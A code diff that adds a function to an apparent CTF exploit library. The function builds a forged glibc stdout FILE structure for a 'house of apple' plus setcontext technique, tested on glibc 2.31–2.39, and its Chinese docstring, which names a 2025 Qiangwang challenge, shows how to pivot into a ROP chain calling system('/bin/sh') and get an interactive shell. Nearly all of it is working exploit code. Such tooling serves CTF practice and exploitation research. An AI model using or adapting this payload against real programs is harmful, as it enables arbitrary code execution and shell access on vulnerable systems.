@@ -519,3 +519,57 @@ def HOA3underflow_orw(libc, payload_addr, flag = b'flag'):
     rop.call(syscall, [1, payload_addr])
     
     return HOA3underflow_rop(libc, payload_addr, rop.chain(), {'rdx':0x100})
+
+def QWB_2025_HOA(libc, rop_size = 0x500):
+    '''
+        强网吧2025 - bph
+        
+        exp:
+            利用_IO_2_1_stdin_去修改_IO_2_1_stdout_结构体
+            通过printf_chk触发house of apple(_IO_wfile_seekoff) + setcontext
+            构造ROPchain实现getshell
+        
+        测试的libc版本: libc-2.{31, 35, 39}.so
+        
+        使用步骤:
+        1. 修改_IO_2_1_stdout_结构体为payload
+        2. 程序执行puts,printf等函数时触发house of apple + setcontext
+        3. 再次写入提前构造好的ropchain实现getshell
+        
+        eg :
+            ```python
+            libc.address = p.libc_mapping().address
+            payload = QWB_2025_HOA(libc)
+
+            # 修改_IO_2_1_stdout_结构体为payload
+            memset(libc.sym['_IO_2_1_stdout_'], len(payload), payload)
+
+            rop = ROP(libc)
+            rop.system(next(libc.search(b'/bin/sh\x00')))
+            p.send(rop.chain())
+
+            p.interactive()
+            ```
+        
+    '''
+    payload_addr = libc.sym['_IO_2_1_stdout_']
+    payload = b''
+    payload += p64(0)
+    payload += p64(0x0) * 2
+    payload += p64(libc.sym['setcontext'] + 61)
+    payload += p64(payload_addr)
+    payload += p64(0) * 8
+    payload += p64(payload_addr)
+    payload += p64(0)
+    payload += p64(payload_addr)
+    payload += p64(0)
+    payload += p64(payload_addr + 8)
+    payload += p64(rop_size)
+    payload += p64(0x23)
+    payload += p64(payload_addr)
+    payload += p64(libc.sym['setcontext'] + 294)
+    payload += p64(libc.sym['read'])
+    payload += p64(0) * 4
+    payload += p64(libc.sym['_IO_wfile_jumps'] + 0x10)
+    payload += p64(payload_addr)
+    return payload
